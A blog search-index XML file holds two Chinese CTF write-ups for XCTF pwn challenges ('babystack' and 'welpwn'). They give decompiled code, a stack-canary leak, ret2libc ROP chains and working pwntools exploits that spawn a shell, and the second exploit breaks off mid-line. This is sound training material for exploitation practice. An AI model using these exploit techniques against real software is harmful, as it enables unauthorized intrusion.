<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XCTF-CHALLENGE-PWN100</title>
      <link href="/2020/07/21/xctf-challenge-pwn100/"/>
      <url>/2020/07/21/xctf-challenge-pwn100/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ checksec babystack<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn100/babystack'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>差点保护全开，有点狠</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-90h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+98h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">sub_4008B9</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 输出菜单</span>    v3 <span class="token operator">=</span> <span class="token function">sub_400841</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// 读取选项</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 存在溢出可能</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">sub_400826</span><span class="token punctuation">(</span><span class="token string">"invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sub_400826</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_400AE7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>用IDA观察后，整个程序没有system  binsh，也没有后门加上出题者给出了libc文件，没得说的这是ret2libc类型。</p><h2 id="3：执行情况"><a href="#3：执行情况" class="headerlink" title="3：执行情况"></a>3：执行情况</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ ./babystack --------1.store2.print3.quit--------<span class="token operator">>></span> 1AAAAAAAAAAAAAA--------1.store2.print3.quit--------<span class="token operator">>></span> 2AAAAAAAAAAAAAA--------1.store2.print3.quit--------<span class="token operator">>></span> </code></pre><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><ul><li>程序在读入时存在溢出，但有cookie的存在所以我们得先想办法泄露cookie。</li><li>cookie泄露很简单只要store ‘A’<em>(0x90-0x8) ，即sh.sendline( ‘A’</em>(0x90-0x8))。后面的’\n’将覆盖cookie的末尾\x00，然后print选项即可。</li><li>得到cookie我们再次store来构造payload泄露真实地址，获取libc版本：payload1 = ‘B’<em>(0x90-0x8) + p64(cookie) + ‘B’</em>8 + p64(pop_rdi_ret)   最后面的地址时main函数，我们还需要进行一次攻击</li><li>payload1 += p64(libc_start_main_got) + p64(puts_plt) + p64(0x00000400908)</li><li>用LicbSearcher获取libc版本，地址，从而得到system  binsh地址</li><li>再次store放入system  binsh   payload</li><li>3quit    实现跳转</li></ul><p><strong>要注意这个程序得自己来实现最后的 return 0；也就是3选项</strong></p><h2 id="5：EXP"><a href="#5：EXP" class="headerlink" title="5：EXP"></a>5：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babystack'</span><span class="token punctuation">)</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400a93</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040067e</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',37000)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############leaking cookie#################"</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xa</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############leaking real addr#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00000400908</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span>  u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span><span class="token keyword">print</span> type<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>libc_start_main<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############fina attack#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">8</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：<span class="token operator">>></span> $ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p>我在本地测试是完全没问题的但，换成远程就不行了，我觉的是对面的服务器抽风了</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-WELPWM</title>
      <link href="/2020/07/19/xctf-challenge-welpwm/"/>
      <url>/2020/07/19/xctf-challenge-welpwm/</url>
      
        <content type="html"><![CDATA[<h2 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1:checksec"></a>1:checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec welpwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/welpwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位，开启NX防护</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-400h]</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Welcome to RCTF\n"</span><span class="token punctuation">,</span> <span class="token number">16uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">echo</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment" spellcheck="true">// 传入buf地址</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>这里buf距离RBP距离与read可以读入的大小相同，所以主函数不存在溢出echo函数：<span class="token keyword">int</span> __fastcall <span class="token function">echo</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    #这个<span class="token keyword">for</span>循环可以将buf中的字符逐个复制到数组s2中，截断条件是\x00    s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"ROIS"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      #这个<span class="token keyword">if</span>完全没必要进去，可能是提醒你注意复制过程的截断问题  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RCTF{Welcome}"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" is not flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没有system，binsh存在，只有puts，read，write等函数，没有后门。看来我们得想办法泄露libc地址了</p><h2 id="3：思路"><a href="#3：思路" class="headerlink" title="3：思路"></a>3：思路</h2><p>在主函数中buf可以容下0x400个字节，但无法溢出。在echo函数中会对buf无限制复制，到s2数组中，当然只要不出现\x00。所以要在main函数中好好构造payload。<br>在main函数中输入时：’A’<em>16 + ‘A’</em>8 + p64(destination).这就应该能跳转到我们的目的地址。我们要达到的目的是泄露某个函数真正的地址，从而获得libc版本，地址，进而获得system，binsh地址。</p><h3 id="payload位置问题"><a href="#payload位置问题" class="headerlink" title="payload位置问题"></a>payload位置问题</h3><p>这差不多是一个ret2libc问题，所以payload上构造的函数，参数少不了。那么问题是echo函数中只有一个大小为16的数组肯定，我们构造的payload的关键函数无法放在那里。那我们来看看栈的分布情况。</p><pre class=" language-bash"><code class="language-bash">main函数全部的汇编push    rbpmov     rbp, rspsub     rsp, 400hnopnopnopnopnopnopnopnopnopnopmov     edx, 10h        <span class="token punctuation">;</span> nmov     esi, offset aWelcomeToRctf <span class="token punctuation">;</span> <span class="token string">"Welcome to RCTF\n"</span>        <span class="token comment" spellcheck="true">#可以看到除了开始部分，下面的代码并没有改变RBP和RSP</span>mov     edi, 1          <span class="token punctuation">;</span> fdcall    _writemov     rax, cs:__bss_startmov     rdi, rax        <span class="token punctuation">;</span> streamcall    _fflushlea     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edx, 400h       <span class="token punctuation">;</span> nbytesmov     rsi, rax        <span class="token punctuation">;</span> bufmov     edi, 0          <span class="token punctuation">;</span> fdcall    _readlea     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     rdi, raxcall    <span class="token keyword">echo</span>mov     eax, 0leaveretnecho函数前部分汇编var_18<span class="token operator">=</span> qword ptr -18hs2<span class="token operator">=</span> byte ptr -10h<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp, rspsub     rsp, 20hmov     <span class="token punctuation">[</span>rbp+var_18<span class="token punctuation">]</span>, rdimov     cs:i, 0</code></pre><p>可以看到这两个函数的栈分布应该是很普通的：<br><img src="https://s1.ax1x.com/2020/07/19/UWq0Ag.png" alt=""><br><strong>我们在main函数中构造的payload，会被echo函数复制到它的栈空间，以此我们可以把返回地址覆盖成我们想要的，但只能复制一个地址。因为p64（地址）会出现\x00截断。不过通过这个设计漏洞我们可以控制程序流程。</strong></p><h3 id="流程控制问题"><a href="#流程控制问题" class="headerlink" title="流程控制问题"></a>流程控制问题</h3><p>现在关键在于返回地址我们要覆盖成什么地址。我们知道在buf中前24个字符是padding，被复制给s2数组。下面就是我们覆盖地址。覆盖地址下面还可以构造函数，所以得返回到buf。<br>前面24个padding+一个地址 会占用4个栈帧，我们可以pop掉。<br><img src="https://s1.ax1x.com/2020/07/19/UWqDhj.png" alt=""><br>所以payload = ‘A’*24 + p64(pop_4_ret) + p64(pop_rdi_ret) + p64(got) +p64(puts_ptl) + p64(main)<br>pop 4次后程序就流会被p64(pop_rdi_ret) + p64(got) +p64(puts_ptl) + p64(main)控制，输出某一个函数的正真地址，这是第一次攻击，然后返回到main函数我们可以以类似的方式构造payload来 执行system binsh。<br>这里用puts来输出地址，没用write，因为找不到pop rdx 这个gadget。</p><p>一开始我就是卡在了如何把前面的padding pop掉的问题，没想到直接可以找一个pop4次的地址来跳转。</p><h2 id="4：寻找gadgets"><a href="#4：寻找gadgets" class="headerlink" title="4：寻找gadgets"></a>4：寻找gadgets</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ ROPgadget --binary welpwn --only <span class="token string">"pop|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x000000000040089c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret        <span class="token comment" spellcheck="true">#选这个保险没有涉及到关键寄存器</span>0x000000000040089e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x00000000004008a0 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x00000000004008a2 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x0000000000400675 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000000004008a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret                                   <span class="token comment" spellcheck="true">#这个要用来pop  rdi参数</span>0x00000000004008a1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x0000000000400589 <span class="token keyword">:</span> ret0x00000000004006a5 <span class="token keyword">:</span> ret 0xc1480x000000000040081a <span class="token keyword">:</span> ret 0xfffd</code></pre><h2 id="5-EXP"><a href="#5-EXP" class="headerlink" title="5:EXP"></a>5:EXP</h2><p>我写的EXP巨丑</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'welpwn'</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_plt==>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gadgates</span><span class="token comment" spellcheck="true">#0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><span class="token comment" spellcheck="true">#0x00000000004008a3 : pop rdi ; ret</span><span class="token comment" spellcheck="true">#0x0000000000400589 : ret   #遇到system调用的堆栈平衡问题了</span><span class="token comment" spellcheck="true">#sh = process('./welpwn')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">41564</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0040089c</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008a3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4005a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#第一次攻击</span><span class="token comment" spellcheck="true">#payload = p64(0x00000000004008a3)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>libc_start_main<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0040089c</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008a3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#第二次攻击</span>payload2 